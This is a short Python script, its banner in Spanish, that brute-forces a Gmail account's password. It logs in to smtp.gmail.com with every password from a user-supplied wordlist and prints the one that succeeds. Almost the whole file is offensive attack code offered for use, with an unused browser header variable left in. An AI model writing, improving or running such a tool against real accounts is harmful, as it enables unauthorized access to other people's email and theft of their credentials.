#!/usr/bin/python

import smtplib
print("""
+++++++++++++++++++++++++++++
+   SCRIPT de bruteforce    +
+                           +
+                           +
+      Version 1.0          +
+                           +
+++++++++++++++++++++++++++++
                                                                                                                                                                                
""")
smtps = smtplib.SMTP("smtp.gmail.com", 587)
smtps.ehlo()
smtps.starttls()

user = input("Digite el email: ")
pospassword = input("Digite la ruta del directorio: ")
pospassword = open(pospassword, "r")

headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


for password in pospassword:
    try:
        smtps.login(user, password)
        print("La contraseña es: %s" % password)
        break;
    except smtplib.SMTPAuthenticationError:
        print("Falló")        
        

